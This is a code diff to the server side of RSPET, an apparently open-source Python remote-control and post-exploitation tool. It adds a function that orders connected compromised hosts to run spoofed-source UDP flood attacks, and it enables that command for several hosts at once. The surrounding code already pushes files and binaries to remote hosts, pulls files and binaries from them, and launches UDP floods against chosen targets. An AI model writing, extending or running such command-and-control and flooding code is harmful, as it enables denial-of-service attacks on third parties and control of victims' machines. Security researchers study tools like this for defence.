@@ -5,7 +5,7 @@ from socket import socket, AF_INET, SOCK_STREAM
 from thread import start_new_thread
 from threading import Thread
 from time import sleep
-    
+
 def conn_accept(sock,handler):
     while True:
         (client, (ip,port)) = sock.accept()
@@ -52,7 +52,46 @@ def UDP_Flood(target,cur_host_con,cur_host_id,handler):
         return 1
     sleep(0.1)
     return 0
-    
+
+def UDP_Spoof(nameSet,cur_host_con,cur_host_id,handler):
+    TARGET_IP = nameSet[0]
+    TARGET_PORT = nameSet[1]
+    SPOOFED_IP = nameSet[2]
+    SPOOFED_PORT = nameSet[3]
+    try:
+        PAYLOAD = nameSet[4]
+    except:
+        PAYLOAD = 'Hi'
+    spoof_command = 'udpSpoof'
+    res = send_comm(spoof_command,cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    sleep(0.1)
+    res = send_comm((TARGET_IP+":"+str(TARGET_PORT)),cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    sleep(0.1)
+    res = send_comm((SPOOFED_IP+":"+str(SPOOFED_PORT)),cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    sleep(0.1)
+    fSize = sys.getsizeof(PAYLOAD)
+    fSize = str(fSize)
+    res = send_comm(fSize,cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    sleep(0.1)
+    res = send_comm(PAYLOAD,cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    sleep (0.1)
+    return 0
+
 def Make_File(nameSet,cur_host_con,cur_host_id,handler):
     fileToRead = nameSet[0]
     try:
@@ -212,7 +251,7 @@ def Pull_Binary(nameSet, cur_host_con, cur_host_id, handler):
         localBin.write(decode)
         localBin.close()
         return 0
-        
+
 def MultihostCalls(funcRef,argsList,handler,list_of_selected_hosts):
     jobs = []
     active_hosts = handler.return_list_of_hosts()
@@ -231,7 +270,7 @@ def MultihostCalls(funcRef,argsList,handler,list_of_selected_hosts):
     for j in jobs:
         j.join()
     return 0
-        
+
 def list_root_commands():
     print ("List of Server Commands")
     print ("$List_Commands -> Display this list")
@@ -249,6 +288,7 @@ def list_connected_commands():
     print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
     print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
     print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
+    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
     print ("$KILL -> All selected Hosts stop current perpetual task")
     print ("$Close_Connection -> Close Connection and remove host")
     print ("$Exit -> Exit to the main interface")
@@ -260,18 +300,24 @@ def list_connected_mult_commands():
     print ("$Make_File localFileName (remoteFileName)-> Create remote file")
     print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
     print ("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
+    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
     print ("$KILL -> All selected Hosts stop current perpetual task")
     print ("$Close_Connection -> close connection with and remove all selected hosts")
     print ("$Exit -> Exit to the main interface")
 
 def make_logo():
     logo = []
+    logo.append("#####################################################")
     logo.append("__________  _________________________________________")
     logo.append("\______   \/   _____/\______   \_   _____/\__    ___/")
     logo.append(" |       _/\_____  \  |     ___/|    __)_   |    |   ")
     logo.append(" |    |   \/        \ |    |    |        \  |    |   ")
     logo.append(" |____|_  /_______  / |____|   /_______  /  |____|   ")
     logo.append("        \/        \/                   \/            ")
+    logo.append("")
+    logo.append("-Author: panagiks (http://panagiks.xyz) -Licence: MIT")
+    logo.append("#####################################################")
+    logo.append("")
     for line in logo:
         print(line)
 
@@ -285,7 +331,7 @@ class RSPET_client_handler():
 
     def remove_host(self, host_id):
         self.list_of_hosts[host_id] = None
-        
+
     def rebuild(self):
         tmp_list = list(filter(lambda a: a != None , self.list_of_hosts))
         self.list_of_hosts = tmp_list
@@ -306,25 +352,27 @@ conn_command_func_dict = {
     "Make_Binary"      : Make_Binary,
     "Pull_File"        : Pull_File,
     "Pull_Binary"      : Pull_Binary,
-    "UDP_Flood"        : UDP_Flood}
+    "UDP_Flood"        : UDP_Flood,
+    "UDP_Spoof"        : UDP_Spoof}
 
 conn_mul_command_func_dict = {
     "Make_File"        : Make_File,
     "Make_Binary"      : Make_Binary,
-    "UDP_Flood"        : UDP_Flood}
+    "UDP_Flood"        : UDP_Flood,
+    "UDP_Spoof"        : UDP_Spoof}
 
 conn_command_dict = {
     "List_Commands"    : 0,
     "KILL"             : 1,
     "Close_Connection" : 2,
-    "Exit"         : 3}
-    
+    "Exit"             : 3}
+
 conn_mul_command_dict = {
     "List_Commands"    : 0,
     "List_Sel_Hosts"   : 1,
     "KILL"             : 2,
     "Close_Connection" : 3,
-    "Exit"         : 4}
+    "Exit"             : 4}
 
 #Start Here!
 make_logo()
